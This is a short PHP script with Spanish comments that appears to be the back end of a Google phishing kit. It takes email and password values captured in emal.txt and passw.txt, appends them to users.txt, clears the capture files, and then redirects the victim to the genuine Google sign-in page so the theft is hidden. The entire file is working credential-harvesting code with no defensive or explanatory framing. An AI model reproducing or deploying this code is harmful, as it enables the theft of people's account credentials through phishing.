
<?php
// Ruta de los archivos
$emalFile = 'emal.txt';
$passwFile = 'passw.txt';
$usersFile = 'users.txt';

// Leer contenido de emal.txt y passw.txt
$emalContent = file_get_contents($emalFile);
$passwContent = file_get_contents($passwFile);

// Guardar contenido en users.txt
file_put_contents($usersFile, "Email: $emalContent\nPassword: $passwContent\n", FILE_APPEND);

// Limpiar contenido de emal.txt y passw.txt
file_put_contents($emalFile, '');
file_put_contents($passwFile, '');

echo 'Proceso completado correctamente.';
header('Location: https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Des&ec=GAlA8wE&hl=es&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S-1509614468%3A1707445746900298&theme=glif');
?>